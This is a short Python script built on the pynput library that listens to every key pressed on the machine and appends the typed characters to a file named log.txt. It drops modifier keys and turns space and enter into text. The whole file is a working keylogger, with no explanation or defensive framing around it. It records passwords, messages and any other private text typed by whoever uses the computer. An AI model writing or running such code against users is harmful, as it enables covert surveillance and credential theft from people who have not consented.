from pynput.keyboard import Listener as KeyboardListener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter in [
        "Key.shift", "Key.shift_r", "Key.shift_l",
        "Key.ctrl", "Key.ctrl_l", "Key.ctrl_r",
        "Key.cmd", "Key.cmd_r", "Key.cmd_l", "Key.cmdKey",
        "Key.alt", "Key.alt_l", "Key.alt_r",
        "Key.backspace", "Key.delete",
        "Key.caps_lock", "Key.tab", "Key.esc",
        "Key.up", "Key.down", "Key.left", "Key.right"
    ]:
        letter = ""
    
    elif letter == "Key.space":
        letter = " "
    elif letter == "Key.enter":
        letter = "\n"
    elif "Key." in letter:
        letter = ""
    
    with open("log.txt", 'a') as f:
        f.write(letter)

with KeyboardListener(on_press=write_to_file) as lis:
    lis.join()